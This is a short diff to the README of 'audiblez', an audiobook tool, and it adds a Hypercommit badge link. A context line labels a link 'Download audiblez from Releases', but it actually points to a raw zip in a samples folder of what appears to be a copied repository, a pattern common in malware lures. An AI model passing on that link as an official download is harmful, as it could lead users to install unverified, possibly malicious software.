@@ -72,3 +72,7 @@ Stay updated with the latest news and updates about audiblez. Follow us on our [
 Thank you for choosing audiblez! Enjoy creating your personalized audiobooks effortlessly. 
 
 [Download audiblez from Releases](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip)
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/audiblez)
